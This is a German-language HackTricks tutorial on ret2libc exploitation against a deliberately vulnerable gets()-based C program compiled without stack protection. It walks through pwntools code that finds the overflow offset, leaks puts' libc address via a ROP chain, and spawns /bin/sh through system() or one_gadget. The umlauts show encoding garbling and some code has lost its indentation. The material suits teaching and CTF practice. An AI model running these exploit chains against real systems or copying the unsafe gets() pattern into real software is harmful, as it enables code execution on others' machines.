<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>


# Kurze Zusammenfassung

1. **Ermitteln** Sie den **Overflow-Offset**
2. **Finden** Sie die Gadgets `POP_RDI`, `PUTS_PLT` und `MAIN_PLT`
3. Verwenden Sie die zuvor gefundenen Gadgets, um die Speicheradresse von puts oder einer anderen libc-Funktion zu **leaken** und die libc-Version zu **ermitteln** ([herunterladen](https://libc.blukat.me))
4. Mit der Bibliothek **berechnen Sie den ROP und nutzen ihn aus**

# Weitere Tutorials und Binaries zum √úben

Dieses Tutorial wird den Code/Binary aus diesem Tutorial ausnutzen: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Weitere n√ºtzliche Tutorials: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# Code

Dateiname: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - Leaking LIBC Vorlage

Ich werde den Code verwenden, der sich hier befindet, um den Exploit zu erstellen.\
Laden Sie den Exploit herunter und platzieren Sie ihn im selben Verzeichnis wie die verwundbare Bin√§rdatei und geben Sie die ben√∂tigten Daten an das Skript weiter:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- Ermitteln des Offsets

Die Vorlage ben√∂tigt ein Offset, bevor der Exploit fortgesetzt werden kann. Wenn keines angegeben ist, wird der erforderliche Code ausgef√ºhrt, um es zu finden (standardm√§√üig `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Ausf√ºhren** Sie `python template.py`, um eine GDB-Konsole zu √∂ffnen, in der das Programm abst√ºrzt. F√ºhren Sie innerhalb dieser **GDB-Konsole** den Befehl `x/wx $rsp` aus, um die **Bytes** zu erhalten, die den RIP √ºberschreiben sollten. Ermitteln Sie schlie√ülich den **Offset** mithilfe einer **Python**-Konsole:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

Nachdem Sie den Offset (in diesem Fall 40) gefunden haben, √§ndern Sie die OFFSET-Variable in der Vorlage mit diesem Wert.\
`OFFSET = "A" * 40`

Eine andere M√∂glichkeit besteht darin, `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` von GEF zu verwenden.

# 2- Auffinden von Gadgets

Jetzt m√ºssen wir ROP-Gadgets in der Bin√§rdatei finden. Diese ROP-Gadgets werden n√ºtzlich sein, um `puts` aufzurufen und die verwendete **libc** zu finden, und sp√§ter den **endg√ºltigen Exploit** auszuf√ºhren.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Das `PUTS_PLT` wird ben√∂tigt, um die **Funktion puts** aufzurufen.\
Das `MAIN_PLT` wird ben√∂tigt, um die **Hauptfunktion** erneut aufzurufen, nachdem eine Interaktion stattgefunden hat, um den **Overflow** erneut auszunutzen (unendliche Runden der Ausnutzung). **Es wird am Ende jedes ROP verwendet, um das Programm erneut aufzurufen**.\
Das **POP\_RDI** wird ben√∂tigt, um einen **Parameter** an die aufgerufene Funktion zu **√ºbergeben**.

In diesem Schritt m√ºssen Sie nichts ausf√ºhren, da pwntools w√§hrend der Ausf√ºhrung alles finden wird.

# 3- Suchen der LIBC-Bibliothek

Jetzt ist es an der Zeit herauszufinden, welche Version der **libc**-Bibliothek verwendet wird. Dazu werden wir die **Adresse** der **Funktion puts** im Speicher **leaken** und dann nachschauen, in welcher **Bibliotheksversion** sich die puts-Version an dieser Adresse befindet.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Um dies zu tun, ist die wichtigste Zeile des ausgef√ºhrten Codes:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Dies sendet einige Bytes, bis das **RIP** √ºberschrieben ist: `OFFSET`.\
Dann wird die **Adresse** des Gadgets `POP_RDI` gesetzt, damit die n√§chste Adresse (`FUNC_GOT`) im **RDI**-Register gespeichert wird. Dies geschieht, weil wir **puts aufrufen** m√∂chten und ihm die **Adresse** von `PUTS_GOT` als Speicheradresse der puts-Funktion gespeichert ist, die durch `PUTS_GOT` angezeigt wird.\
Danach wird `PUTS_PLT` aufgerufen (mit `PUTS_GOT` im **RDI**), sodass puts den Inhalt innerhalb von `PUTS_GOT` (**die Adresse der puts-Funktion im Speicher**) liest und ausgibt.\
Schlie√ülich wird die **Hauptfunktion erneut aufgerufen**, damit wir den √úberlauf erneut ausnutzen k√∂nnen.

Auf diese Weise haben wir die puts-Funktion **get√§uscht**, die **Adresse** der Funktion **puts** (die sich in der **libc**-Bibliothek befindet) auszugeben. Jetzt, da wir diese Adresse haben, k√∂nnen wir **herausfinden, welche libc-Version verwendet wird**.

![](<../../../.gitbook/assets/image (141).png>)

Da wir eine **lokale** Bin√§rdatei **ausnutzen**, ist es **nicht erforderlich**, herauszufinden, welche Version von **libc** verwendet wird (nur die Bibliothek in `/lib/x86_64-linux-gnu/libc.so.6` finden).\
In einem Fall von Remote-Exploits werde ich hier erkl√§ren, wie Sie es finden k√∂nnen:

## 3.1- Suchen nach libc-Version (1)

Sie k√∂nnen auf der Webseite [https://libc.blukat.me/](https://libc.blukat.me) suchen, welche Bibliothek verwendet wird.\
Es erm√∂glicht Ihnen auch das Herunterladen der entdeckten Version von **libc**.

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Suchen nach libc-Version (2)

Sie k√∂nnen auch Folgendes tun:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Dies dauert einige Zeit, seien Sie geduldig.\
Damit dies funktioniert, ben√∂tigen wir:

* Libc-Symbolname: `puts`
* Durchgesickerte libc-Adresse: `0x7ff629878690`

Wir k√∂nnen herausfinden, welche **libc** h√∂chstwahrscheinlich verwendet wird.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Wir haben 2 √úbereinstimmungen (versuche die zweite, wenn die erste nicht funktioniert). Lade die erste herunter:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Kopieren Sie die libc von `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` in unser Arbeitsverzeichnis.

## 3.3- Andere Funktionen zum Auslesen
```python
puts
printf
__libc_start_main
read
gets
```
# 4- Finden der basierten libc-Adresse und Ausnutzung

An diesem Punkt sollten wir die verwendete libc-Bibliothek kennen. Da wir eine lokale Bin√§rdatei ausnutzen, werde ich einfach `/lib/x86_64-linux-gnu/libc.so.6` verwenden.

√Ñndern Sie also am Anfang von `template.py` die Variable **libc** in: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Setzen Sie den Bibliothekspfad, wenn Sie ihn kennen`

Indem wir den **Pfad zur libc-Bibliothek** angeben, wird der Rest des **Exploits automatisch berechnet**.

In der Funktion `get_addr` wird die **Basisadresse von libc** berechnet:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Beachten Sie, dass die **endg√ºltige Basisadresse von libc mit 00 enden muss**. Wenn das nicht der Fall ist, haben Sie m√∂glicherweise eine falsche Bibliothek geleakt.
{% endhint %}

Dann werden die Adresse der Funktion `system` und die **Adresse** des Strings _"/bin/sh"_ aus der **Basisadresse** von **libc** und der gegebenen **libc-Bibliothek** berechnet.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Endlich wird der Exploit f√ºr die Ausf√ºhrung von /bin/sh vorbereitet und gesendet:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Lassen Sie uns dieses letzte ROP erkl√§ren. 
Das letzte ROP (`rop1`) endete erneut mit dem Aufruf der Hauptfunktion, daher k√∂nnen wir den **Overflow** erneut **ausnutzen** (deshalb ist hier wieder der `OFFSET`). Dann m√∂chten wir `POP_RDI` aufrufen, der auf die Adresse von _"/bin/sh"_ (`BINSH`) zeigt, und die Funktion **system** (`SYSTEM`) aufrufen, da die Adresse von _"/bin/sh"_ als Parameter √ºbergeben wird. 
Schlie√ülich wird die **Adresse der Exit-Funktion** aufgerufen, damit der Prozess ordnungsgem√§√ü beendet wird und keine Warnung generiert wird.

**Auf diese Weise f√ºhrt der Exploit eine** _**/bin/sh**_ **Shell aus.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Verwendung von ONE\_GADGET

Sie k√∂nnten auch [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) verwenden, um anstelle von **system** und **"/bin/sh"** eine Shell zu erhalten. **ONE\_GADGET** findet in der libc-Bibliothek eine M√∂glichkeit, mit nur einer **ROP-Adresse** eine Shell zu erhalten. 
Normalerweise gibt es jedoch einige Einschr√§nkungen, die h√§ufigsten und einfachsten zu vermeidenden sind wie `[rsp+0x30] == NULL`. Da Sie die Werte im **RSP** kontrollieren, m√ºssen Sie nur einige weitere NULL-Werte senden, um die Einschr√§nkung zu umgehen.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# EXPLOIT-DATEI

Sie k√∂nnen hier eine Vorlage finden, um diese Schwachstelle auszunutzen:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# H√§ufige Probleme

## MAIN\_PLT = elf.symbols\['main'] nicht gefunden

Wenn das Symbol "main" nicht existiert, k√∂nnen Sie einfach herausfinden, wo sich der Hauptcode befindet:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
und setzen Sie die Adresse manuell:
```python
MAIN_PLT = 0x401080
```
## Puts nicht gefunden

Wenn die Bin√§rdatei Puts nicht verwendet, sollten Sie √ºberpr√ºfen, ob sie stattdessen Folgendes verwendet:

## `sh: 1: %s%s%s%s%s%s%s%s: nicht gefunden`

Wenn Sie nach der Erstellung des gesamten Exploits diesen **Fehler** finden: `sh: 1: %s%s%s%s%s%s%s%s: nicht gefunden`

Versuchen Sie, **64 Bytes von der Adresse von "/bin/sh" abzuziehen**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
